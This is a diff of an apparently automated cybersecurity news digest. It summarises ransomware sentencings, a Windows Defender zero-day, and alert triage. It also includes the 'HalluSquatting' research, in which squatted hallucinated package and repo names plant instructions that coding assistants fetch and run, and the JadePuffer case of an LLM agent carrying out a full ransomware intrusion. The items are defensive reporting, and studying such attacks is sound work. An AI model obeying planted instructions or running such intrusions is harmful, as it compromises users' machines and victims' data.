@@ -3002,64 +3011,115 @@ Image: Sasun Bughdaryan via Unsplash Ryuk operator pleads guilty; Blackcat/AlphV
   - Published: 2026-07-10T17:01:00+00:00
   - Link: https://therecord.media/ryuk-operator-pleads-guilty-alphv-conspirator-sentenced
   - Summary: One man accused of deploying Ryuk ransomware pleaded guilty Wednesday in an Oregon federal court to conspiracy and computer fraud, while another man received a 70-month federal prison sentence in a Florida court for helping the Blackcat/AlphV gang extort multiple victims.
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Former ransomware negotiator gets 4 years for BlackCat attacks
-  - Published: 2026-07-10T08:17:52+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/us-ransomware-negotiator-gets-4-years-in-prison-for-blackcat-attacks/
-  - Summary: A former employee of cybersecurity incident response company DigitalMint was sentenced to 70 months in prison for targeting U.S. companies in BlackCat (ALPHV) ransomware attacks. [...]
 - **SecurityWeek** (cyber_news_breach_reporting)
   - Title: Third US Security Expert Sentenced to Prison for Helping Ransomware Gang
   - Published: 2026-07-10T12:58:39+00:00
   - Link: https://www.securityweek.com/third-us-security-expert-sentenced-to-prison-for-helping-ransomware-gang/
   - Summary: Angelo Martino, a former ransomware negotiator, was sentenced to 70 months for helping the BlackCat/Alphv group. The post Third US Security Expert Sentenced to Prison for Helping Ransomware Gang appeared first on SecurityWeek .
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Former ransomware negotiator gets 4 years for BlackCat attacks
+  - Published: 2026-07-10T08:17:52+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/us-ransomware-negotiator-gets-4-years-in-prison-for-blackcat-attacks/
+  - Summary: A former employee of cybersecurity incident response company DigitalMint was sentenced to 70 months in prison for targeting U.S. companies in BlackCat (ALPHV) ransomware attacks. [...]
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Ransomware Negotiator Gets 70 Months in Prison for Aiding BlackCat Attacks
   - Published: 2026-07-10T08:10:12+00:00
   - Link: https://thehackernews.com/2026/07/ransomware-negotiator-gets-70-months-in.html
   - Summary: A 41-year-old former ransomware negotiator has been sentenced to nearly six years (i.e., 70 months) in prison in the U.S. for their role in conspiring with the now-defunct BlackCat ransomware operators to extort multiple victims and working with two other cybersecurity professionals to target additional victims in 2023. In a sentencing memorandum, federal prosecutors described Martino as a "
 
-### Cluster acf9e6b981 — score 8
+### Cluster d1756ef0c6 — score 8
 
-- Title: Latvian forestry company still restoring systems weeks after ransomware attack
-- Source: The Record (cyber_news_breach_reporting)
-- Published: 2026-07-09T14:20:00+00:00
-- Link: https://therecord.media/latvia-state-owned-foresty-company-lvm-ransomware
+- Title: ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-07-10T08:32:33+00:00
+- Link: https://www.securityweek.com/hallusquatting-turns-ai-hallucinations-into-botnet-delivery-mechanism/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- affected_industries: government
-- content_type: incident_report
+- threat_categories: ai_security, phishing_social_eng, ransomware_extortion
+- affected_industries: education, manufacturing_industrial
+- affected_products: GitHub, Okta, Palo Alto Networks
+- content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- affected_industries: government
-- content_type: incident_report
+- threat_categories: ransomware_extortion, phishing_social_eng, ai_security
+- affected_industries: manufacturing_industrial, education
+- affected_products: Okta, Palo Alto Networks, GitHub
+- content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Summary
 
 ```
-A foreign, financially motivated group was responsible for a cyberattack on state-owned forestry company Latvijas Valsts Mezi (LVM), officials said.
+Researchers demonstrate adversarial hallucination squatting against popular AI assistants to achieve remote code execution. The post ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism appeared first on SecurityWeek .
 ```
 
 #### Full body
 
 ```
-Hikers in the woods in Brenguļi, Latvia. Image: Anna Ansone via Unsplash Latvian forestry company still restoring systems weeks after ransomware attack Latvia's state-owned forestry company, LVM, said on Thursday it is still working to restore its IT systems weeks after a ransomware attack disrupted several internal and customer services. The attack, first disclosed in late June, knocked the company's mapping platform and hunting application, as well as systems used to exchange information with contractors and customers offline. Latvian authorities said the attackers had likely been inside the company's network for more than a week before they were detected. LVM's chief technology officer, Maris Kuzmins, told local media earlier this week that the situation has stabilized, but returning operations to normal remains "quite challenging." About two-thirds of customers with service contracts still do not have access to the affected systems, he said. According to Kuzmins, the attackers exploited a vulnerability in a system that had not been updated for two years, but he did not identify the affected software. The company previously said it had not received a ransom demand and would refuse to pay even if one were made. Latvijas Valsts Mezi is one of the country's most profitable state-owned companies . It manages most of Latvia's state forests; harvests and sells timber; maintains public recreation sites; and provides geographic information and mapping services. Latvia's national computer emergency response team, CERT.LV, attributed the intrusion to a foreign, financially motivated ransomware group that has previously targeted companies and public institutions in NATO and European Union countries. Officials have not identified the group. The attackers leaked roughly 44 gigabytes of stolen data online, although investigators believe they accessed significantly more information than they ultimately published. According to CERT.LV, the exposed files include internal documents, email correspondence, software code repositories, digital certificates, cryptographic keys and user credentials. Election infrastructure is separate The attack also prompted scrutiny because LVM helped develop new functionality for Latvia's electronic voter registration system, which allows voters to cast ballots at any polling station. Latvian authorities said the election infrastructure was not compromised because the software was developed in a separate environment and its code was never stored in LVM's corporate repositories. CERT.LV said it had reviewed every software delivery made for that project and found no evidence of malicious code or unauthorized access, concluding the system is safe to use in the upcoming parliamentary elections. CERT.LV said the same threat actor also compromised a server belonging to Latvian pharmaceutical company Olpha, formerly known as Olainfarm. The Olpha breach has since been contained, with no evidence so far of broader damage beyond the affected server. Authorities said the two breaches were technically unrelated despite being attributed to the same threat actor. According to CERT.LV, the group behind the incident "continues its activities in Latvian cyberspace, purposefully searching for new potential vulnerabilities in the infrastructures of public- and private-sector organizations." Cybercrime Government News Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
+Researchers from Tel Aviv University, Technion, and Intuit have detailed a new attack technique dubbed ‘HalluSquatting’ that turns AI assistants’ tendency to hallucinate into a scalable infection vector. The cybersecurity community has identified several ways to hack or hijack AI tools through prompt injection delivered via channels such as emails, logs, comments, and messaging notifications. These promptware attacks leverage the fact that the attacker has a direct channel to the targeted user’s LLM application. HalluSquatting, on the other hand, has been described as a form of untargeted promptware that relies on a technique named adversarial hallucination squatting, in which threat actors can exploit AI applications at scale without a direct channel. In a HalluSquatting attack, the attacker pre-registers the fake repository or package names that LLMs commonly invent when asked to fetch popular, trending resources. The research team says hallucination rates in their tests reached as high as 85% for repo-cloning prompts and 100% for skill installations, and that the same hallucinated names tend to recur across different foundation models, making the technique broadly transferable. Advertisement. Scroll to continue reading. Once the hallucinated repositories and packages are registered, the attacker can plant malicious instructions inside them. When an unsuspecting user asks an AI tool like Cursor, Windsurf, GitHub Copilot, Cline, Gemini CLI, or OpenClaw to clone a repository or install a skill, the assistant may hallucinate the squatted name, pull it down, and execute the attacker’s commands via its built-in terminal. Those commands can direct the AI to run additional tools or code, potentially deploying various types of malware or hacking tools. The HalluSquatting research has focused on using the technique to create agentic botnets whose size depends on how often AI tools hallucinate the attacker’s squatted resource. Traditional botnets rely on vulnerabilities, weak security practices, and lateral movement. In contrast, agentic botnets spread via prompt injections that bypass traditional firewalls and can take root on virtually any device, resulting in a far more heterogeneous population of compromised hosts than botnets such as Mirai . Affected vendors were notified before the publication of the HalluSquatting research , and the researchers withheld exploit details they believe could be directly reused by attackers. Related : AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Related : Google Dialogflow CX Bug Allowed Attackers to Hijack AI Conversations Related : Critical Vulnerability Exposes GitHub Agentic Workflows to Prompt Injection Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Google Patches 382 Chrome Vulnerabilities BlueHammer Vulnerability Exploited in Ransomware Attacks Nissan Employee Data Breached in Oracle PeopleSoft Hack New Controller Flaws Expose Highway Signs and Billboards to Remote Hacking WhatsApp Rolling Out Username Feature to Bolster Phone Number Privacy Latest News In Other News: DHS Database Hacked, Adobe Boosts Patch Cadence, Canada Disrupts Ransomware Ops Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force Okta Warns of Vishing Attacks Targeting Microsoft 365 Customers
 ```
 
 #### Corroborating sources (1)
 
-- **The Record** (cyber_news_breach_reporting)
-  - Title: Latvian forestry company still restoring systems weeks after ransomware attack
-  - Published: 2026-07-09T14:20:00+00:00
-  - Link: https://therecord.media/latvia-state-owned-foresty-company-lvm-ransomware
-  - Summary: A foreign, financially motivated group was responsible for a cyberattack on state-owned forestry company Latvijas Valsts Mezi (LVM), officials said.
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism
+  - Published: 2026-07-10T08:32:33+00:00
+  - Link: https://www.securityweek.com/hallusquatting-turns-ai-hallucinations-into-botnet-delivery-mechanism/
+  - Summary: Researchers demonstrate adversarial hallucination squatting against popular AI assistants to achieve remote code execution. The post ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism appeared first on SecurityWeek .
+
+### Cluster 8fa37afed0 — score 8
+
+- Title: Microsoft Reins in RoguePlanet Zero-Day Threat
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-07-09T20:21:19+00:00
+- Link: https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- affected_industries: financial_services, legal_professional
+- affected_products: Microsoft Defender
+- cve_ids: CVE-2026-33825, CVE-2026-50656
+- urgency_signals: emergency_patch, no_patch_yet, poc_available, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- affected_industries: financial_services, legal_professional
+- affected_products: Microsoft Defender
+- cve_ids: CVE-2026-50656, CVE-2026-33825
+- urgency_signals: zero_day, emergency_patch, no_patch_yet, poc_available
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.
+```
+
+#### Full body
+
+```
+Vulnerabilities & Threats Cyber Risk Application Security Cybersecurity Operations News Microsoft Reins in RoguePlanet Zero-Day Threat The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days. Rob Wright , Senior News Director , Dark Reading July 9, 2026 4 Min Read Source: Mark StevensonUIG via Getty Images Microsoft has tackled yet another zero-day vulnerability published by a disgruntled security researcher with a vendetta against the software giant. On Wednesday, Microsoft issued an out-of-band patch for RoguePlanet , an elevation-of-privilege vulnerability in Windows Defender, tracked as CVE-2026-50656. The high-severity flaw, which received a 7.8 CVSS score from Microsoft, could allow an attacker to escalate privileges on a Windows device from a basic user to the highest SYSTEM-level access, which would give them complete control over the device. RoguePlanet was initially published, along with a proof-of-concept (PoC) exploit, by an anonymous security researcher known as "Nightmare-Eclipse," who has been embroiled in a public feud with Microsoft for several months. The dispute began in April when the researcher published an exploit for another privilege-escalation flaw in Windows Defender, dubbed " BlueHammer " and tracked as CVE-2026-33825, out of frustration with Microsoft's Security Response Center (MSRC). Related: Fresh ATM Crypto Software Bugs: Jackpot or Bust? The feud escalated over several weeks, with Microsoft taking action and issuing legal threats, while Nightmare-Eclipse continued publishing additional zero-day exploits , several of which came under attack soon after. The research swore revenge against Microsoft for allegedly humiliating them, and threatened to "make sure your bones are shattered" on July 14, though Nightmare-Eclipse has since backed off that date. RoguePlanet's Enterprise Cyber-Risks The patch for RoguePlanet is included in the Microsoft Malware Protection Engine version 1.1.26060.3008. According to Microsoft's advisory for CVE-2026-50656, Windows systems that have disabled Microsoft Defender "are not in an exploitable state." However, Microsoft noted the attack complexity for the vulnerability is low, and that exploitation is "more likely." In a blog post on Thursday, SOCRadar noted that while RoguePlanet requires local access to a vulnerable device before exploitation and is best described a post-compromise privilege-escalation exploit, it's still dangerous. "RoguePlanet is not remotely exploitable by itself, but it can be highly valuable after an attacker gains local code execution as a standard user," the research team wrote in the blog post. As a second-stage tool, SOCRadar said RoguePlanet could give a threat actor the ability to tamper with security products and telemetry, dump credentials for lateral movement, and establish persistence through scheduled tasks and other techniques. Additionally, SOCRadar noted that Nightmare-Eclipse's ongoing feud with Microsoft has "driven multiple public exploit releases ahead of typical patch cycles, increasing risk for unpatched environments." SOCRadar chief information security officer (CISO) Ensar Seker tells Dark Reading that, while it's unusual for Microsoft to issue an emergency update shortly before a Patch Tuesday release (July's is on the 14th), it's likely due to increased urgency around a flaw. Related: CitrixBleed-ing Again? NetScaler Vulnerability Under Attack "Nightmare-Eclipse has repeatedly published detailed technical analyses and proof-of-concept exploits shortly after Patch Tuesday, reducing the amount of time defenders have before attackers can begin weaponizing the research," Seker says. "Even if Microsoft had already been preparing the fix, widespread public availability of exploit details likely accelerated its release." RoguePlanet's Uncertain Exploitation Status Despite a public exploit being av
+```
+
+#### Corroborating sources (1)
+
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: Microsoft Reins in RoguePlanet Zero-Day Threat
+  - Published: 2026-07-09T20:21:19+00:00
+  - Link: https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat
+  - Summary: The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.
 
 ### Cluster e90c682b86 — score 8
 
@@ -3095,7 +3155,7 @@ An "agentic threat actor" successfully exploited a Langflow flaw to steal data f
 #### Full body
 
 ```
-Cyberattacks & Data Breaches Threat Intelligence Cybersecurity Operations Vulnerabilities & Threats News JadePuffer: The First Complete LLM-Driven Ransomware Attack An "agentic threat actor" successfully exploited a Langflow flaw to steal data from a production database server and encrypt other systems. Elizabeth Montalbano , Contributing Writer July 6, 2026 4 Min Read Source: Boy Wirat via Getty Images The first documented case of an end-to-end ransomware operation executed autonomously by a large language model (LLM) has successfully performed extortion without a human operator, ushering in a new era in cyberattacks that has long been expected by security experts. Researchers at Sysdig discovered a campaign run by an " agentic threat actor" (ATA) they call JadePuffer, which exploited a flaw in an Internet-facing Langflow deployment and then pivoted to a production database server to run an adaptive and fully automated ransomware campaign, according to a recent report . The attack unfolded across two distinct targets. First, JadePuffer exploited CVE-2025-3248 , an unauthenticated remote code execution (RCE) vulnerability affecting Langflow, which is an open source tool for building AI applications. Then JadePuffer breached its intended target: a separate Internet-exposed production server running a MySQL database and an Alibaba Nacos configuration service, according to Sysdig. Next, JadePuffer enumerated the database contents, exfiltrated selected data, deleted the database, and left an extortion note demanding payment in exchange for the stolen information. Related: 'GodDamn' Ransomware Uses BYOVD to Smite US Companies During the attack, the machine compromised during initial access was used in the compromise of the final target, with all payloads delivered as Base64-encoded Python through the Langflow RCE endpoint. JadePuffer Unsophisticated, Yet Adaptable None of JadePuffer's specific attack techniques were novel or sophisticated, says Johan Edholm, co-founder of Detectify, who calls the attack "more evolution than invention." "Exploiting an exposed service, harvesting credentials, moving laterally, abusing default configurations, and destroying databases are all familiar parts of the playbook," he tells Dark Reading. What's remarkable, however, is that these tactics were strung together by an AI model into a complete ransomware operation against an organization's exposed Internet-facing infrastructure, according to Sysdig. This is unlike traditional ransomware , which relies on prewritten scripts or operator intervention during key stages of an intrusion. The most striking aspect was that "JadePuffer's own payloads were self-narrating," Michael Clark, Sysdig's director of threat research, wrote in the report. "They contained natural language reasoning, target prioritization, and the kind of detailed annotations that human operators don't often write but LLM-generated code produces reflexively." Sysdig observed an operation that adapted in real time, re-attempting failed steps within refined parameters in such a way that the attack went from a failed login to a working fix in 31 seconds, according to the post. ‍ Related: Vidar Infostealer Hammers SMBs via Malvertising Campaign AI-Driven Ransomware Was Inevitable Indeed, JadePuffer demonstrates how AI agents are evolving from productivity tools into autonomous offensive capabilities, representing a paradigm shift in how extortion-based attacks are carried out, according to Clark. "An LLM agent can chain reconnaissance, credential theft, lateral movement, persistence, and destruction without the operator possessing deep expertise in any one step," he wrote. "Tradecraft that once implied a capable human now implies a capable model." Since the introduction of LLMs, security experts have predicted that ransomware and other cyberattacks would inevitably be entirely generated by AI . In fact, last August, security researchers believed they discovered the first AI-driven ransomwar
+Cyberattacks & Data Breaches Threat Intelligence Cybersecurity Operations Vulnerabilities & Threats News JadePuffer: The First Complete LLM-Driven Ransomware Attack An "agentic threat actor" successfully exploited a Langflow flaw to steal data from a production database server and encrypt other systems. Elizabeth Montalbano , Contributing Writer July 6, 2026 4 Min Read Source: Boy Wirat via Getty Images The first documented case of an end-to-end ransomware operation executed autonomously by a large language model (LLM) has successfully performed extortion without a human operator, ushering in a new era in cyberattacks that has long been expected by security experts. Researchers at Sysdig discovered a campaign run by an " agentic threat actor" (ATA) they call JadePuffer, which exploited a flaw in an Internet-facing Langflow deployment and then pivoted to a production database server to run an adaptive and fully automated ransomware campaign, according to a recent report . The attack unfolded across two distinct targets. First, JadePuffer exploited CVE-2025-3248 , an unauthenticated remote code execution (RCE) vulnerability affecting Langflow, which is an open source tool for building AI applications. Then JadePuffer breached its intended target: a separate Internet-exposed production server running a MySQL database and an Alibaba Nacos configuration service, according to Sysdig. Next, JadePuffer enumerated the database contents, exfiltrated selected data, deleted the database, and left an extortion note demanding payment in exchange for the stolen information. Related: Turning the Tables on Email Scammers With 'ScamBuster' During the attack, the machine compromised during initial access was used in the compromise of the final target, with all payloads delivered as Base64-encoded Python through the Langflow RCE endpoint. JadePuffer Unsophisticated, Yet Adaptable None of JadePuffer's specific attack techniques were novel or sophisticated, says Johan Edholm, co-founder of Detectify, who calls the attack "more evolution than invention." "Exploiting an exposed service, harvesting credentials, moving laterally, abusing default configurations, and destroying databases are all familiar parts of the playbook," he tells Dark Reading. What's remarkable, however, is that these tactics were strung together by an AI model into a complete ransomware operation against an organization's exposed Internet-facing infrastructure, according to Sysdig. This is unlike traditional ransomware , which relies on prewritten scripts or operator intervention during key stages of an intrusion. The most striking aspect was that "JadePuffer's own payloads were self-narrating," Michael Clark, Sysdig's director of threat research, wrote in the report. "They contained natural language reasoning, target prioritization, and the kind of detailed annotations that human operators don't often write but LLM-generated code produces reflexively." Sysdig observed an operation that adapted in real time, re-attempting failed steps within refined parameters in such a way that the attack went from a failed login to a working fix in 31 seconds, according to the post. ‍ Related: 'GodDamn' Ransomware Uses BYOVD to Smite US Companies AI-Driven Ransomware Was Inevitable Indeed, JadePuffer demonstrates how AI agents are evolving from productivity tools into autonomous offensive capabilities, representing a paradigm shift in how extortion-based attacks are carried out, according to Clark. "An LLM agent can chain reconnaissance, credential theft, lateral movement, persistence, and destruction without the operator possessing deep expertise in any one step," he wrote. "Tradecraft that once implied a capable human now implies a capable model." Since the introduction of LLMs, security experts have predicted that ransomware and other cyberattacks would inevitably be entirely generated by AI . In fact, last August, security researchers believed they discovered the first AI-driven ransomware,
 ```
 
 #### Corroborating sources (1)
@@ -3105,6 +3165,45 @@ Cyberattacks & Data Breaches Threat Intelligence Cybersecurity Operations Vulner
   - Published: 2026-07-06T16:36:50+00:00
   - Link: https://www.darkreading.com/cyberattacks-data-breaches/jadepuffer-first-complete-llm-driven-ransomware-attack
   - Summary: An "agentic threat actor" successfully exploited a Langflow flaw to steal data from a production database server and encrypt other systems.
+
+### Cluster 152995b5e9 — score 8
+
+- Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
+- Source: Black Hills Information Security (detection_response_operations)
+- Published: 2026-07-08T14:00:00+00:00
+- Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
+```
+
+#### Full body
+
+```
+8 Jul 2026 Active SOC , Blue Team , DFIR , Hayden Covington , Incident Response , Informational Alert Traige , Detection Logic , Infosec for Beginners , InfoSec Survival Guide , Orange Book , SIEM Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage | Hayden Covington This article was originally published in the InfoSec Survival Guide: Orange Book — Incident Response. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security engineers, analysts, and incident responders all have one thing in common, and I’m not talking about 3 AM phone calls concerning incidents. I’m talking about triage: that challenging moment of urgency when assessments must be made and classifications communicated—for the right things to be decided on to prevent the bad stuff from happening. We’re all petrified about missing a critical event or misclassifying an alert, but when we’re talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It’s easy to get caught up with one alert because it feels “too hot” or maybe not spend enough time looking into something that initially seems “too cold.” I’ll provide some tips, tricks, and techniques to help find that “Goldilocks Zone” of spending just the right amount of time on an alert, allowing you to quickly triage and move on to the next. Consider the Severities The simplest way to triage events is to consider the severity of the alert. Initially, most Low-severity alerts should be entirely ignored. On any given case, time is limited, and the value return of going over hundreds of Low alerts is not even remotely comparable to that of reviewing higher priority findings. Mediums will often be the bulk of your alert volume, with these being right in that uncomfortable middle of the “Probably nothing” of Lows and the “Definitely something” of Highs or Criticals. To move quickly on an IR engagement, I categorically relegate the Medium alerts to a later time on that case; and almost every time, the High and Critical alerts tell the real story, giving concrete direction on how to search the Mediums and Lows in a more targeted fashion. Anomalies Against the Baseline One of the most surefire ways to quickly classify an event as a true or false positive is to compare the activity against the normal baseline: “Does this happen regularly on this host,” “in this environment,” or maybe even “in any of the environments I can observe?” While a certain execution or activity on one host may appear anomalous, once you discover that it happens on a number of hosts across multiple environments, either you’ve just found your answer, or you’ve discovered a much bigger issue… Actions on Objective One of my favorite tactics is considering “actions on objective.” If an attacker gains access to a host, they have an end goal in mind. Whether that goal is financially motivated, a desire to steal data, or even if they just want to observe activity in the environment—they broke in for a purpose. Someone isn’t going to go through the effort of breaking into your house just to stand around. For the attacker to achieve their goals, some form of activity must occur to get them there. That often looks like exfiltration or lateral movement. All that to say, if the activity you’re looking at never actually goes anywhere, steals anything, or tries to override anything else, chances are it may not actually be evil, because it certainly isn’t doing the attacker much good. Detection Intent Probably the most novel (and somewhat controversial) approach I’ve come across is considering detection intent first and foremost. This approach requires you to understand exactly what it is that the rule that fired is looking for, and to look for that one specific thing only, ignoring anything else you may see in the periphery. That idea may sound counterintuitive but think about it: Threat detections are often straightfor
+```
+
+#### Corroborating sources (1)
+
+- **Black Hills Information Security** (detection_response_operations)
+  - Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
+  - Published: 2026-07-08T14:00:00+00:00
+  - Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
+  - Summary: We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
 
 ### Cluster 322e51d984 — score 8
 
@@ -3146,45 +3245,6 @@ Help Net Security July 10, 2026 Share Turning software supply chain security int
   - Published: 2026-07-10T05:30:03+00:00
   - Link: https://www.helpnetsecurity.com/2026/07/10/software-supply-chain-security-video/
   - Summary: In this Help Net Security video, Anastasia Tikhonova, Global Threat Research Lead at Group-IB, explains how to operationalize software supply chain risk. Instead of filing an SBOM away as a compliance document, she argues teams should use it every day for vulnerability triage, vendor access reviews, identity monitoring, and incident response. Drawing on Group-IB’s High-Tech Crime Trend Report 2026, she shows how supply chain attacks now link phishing, ransomware, and data breaches through inherited trust. … More → The post Turning software supply chain security into a daily habit appeared first on Help Net Security .
-
-### Cluster 152995b5e9 — score 8
-
-- Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
-- Source: Black Hills Information Security (detection_response_operations)
-- Published: 2026-07-08T14:00:00+00:00
-- Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
-```
-
-#### Full body
-
-```
-8 Jul 2026 Active SOC , Blue Team , DFIR , Hayden Covington , Incident Response , Informational Alert Traige , Detection Logic , Infosec for Beginners , InfoSec Survival Guide , Orange Book , SIEM Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage | Hayden Covington This article was originally published in the InfoSec Survival Guide: Orange Book — Incident Response. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security engineers, analysts, and incident responders all have one thing in common, and I’m not talking about 3 AM phone calls concerning incidents. I’m talking about triage: that challenging moment of urgency when assessments must be made and classifications communicated—for the right things to be decided on to prevent the bad stuff from happening. We’re all petrified about missing a critical event or misclassifying an alert, but when we’re talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It’s easy to get caught up with one alert because it feels “too hot” or maybe not spend enough time looking into something that initially seems “too cold.” I’ll provide some tips, tricks, and techniques to help find that “Goldilocks Zone” of spending just the right amount of time on an alert, allowing you to quickly triage and move on to the next. Consider the Severities The simplest way to triage events is to consider the severity of the alert. Initially, most Low-severity alerts should be entirely ignored. On any given case, time is limited, and the value return of going over hundreds of Low alerts is not even remotely comparable to that of reviewing higher priority findings. Mediums will often be the bulk of your alert volume, with these being right in that uncomfortable middle of the “Probably nothing” of Lows and the “Definitely something” of Highs or Criticals. To move quickly on an IR engagement, I categorically relegate the Medium alerts to a later time on that case; and almost every time, the High and Critical alerts tell the real story, giving concrete direction on how to search the Mediums and Lows in a more targeted fashion. Anomalies Against the Baseline One of the most surefire ways to quickly classify an event as a true or false positive is to compare the activity against the normal baseline: “Does this happen regularly on this host,” “in this environment,” or maybe even “in any of the environments I can observe?” While a certain execution or activity on one host may appear anomalous, once you discover that it happens on a number of hosts across multiple environments, either you’ve just found your answer, or you’ve discovered a much bigger issue… Actions on Objective One of my favorite tactics is considering “actions on objective.” If an attacker gains access to a host, they have an end goal in mind. Whether that goal is financially motivated, a desire to steal data, or even if they just want to observe activity in the environment—they broke in for a purpose. Someone isn’t going to go through the effort of breaking into your house just to stand around. For the attacker to achieve their goals, some form of activity must occur to get them there. That often looks like exfiltration or lateral movement. All that to say, if the activity you’re looking at never actually goes anywhere, steals anything, or tries to override anything else, chances are it may not actually be evil, because it certainly isn’t doing the attacker much good. Detection Intent Probably the most novel (and somewhat controversial) approach I’ve come across is considering detection intent first and foremost. This approach requires you to understand exactly what it is that the rule that fired is looking for, and to look for that one specific thing only, ignoring anything else you may see in the periphery. That idea may sound counterintuitive but think about it: Threat detections are often straightfor
-```
-
-#### Corroborating sources (1)
-
-- **Black Hills Information Security** (detection_response_operations)
-  - Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
-  - Published: 2026-07-08T14:00:00+00:00
-  - Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
-  - Summary: We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
 
 ### Cluster 9799cce73c — score 8
 
